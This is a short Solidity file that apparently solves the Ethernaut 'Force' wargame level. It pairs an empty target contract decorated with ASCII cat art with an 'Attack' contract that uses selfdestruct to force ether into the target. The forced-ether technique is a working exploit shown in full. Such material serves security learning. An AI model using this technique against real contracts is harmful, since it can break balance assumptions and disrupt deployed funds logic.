// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {
    /*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/
}

contract Attack {
    address public force;

    constructor(address _force) payable {
        force = _force;
    }

    function attack() public {
        selfdestruct(payable(force));
    }
}
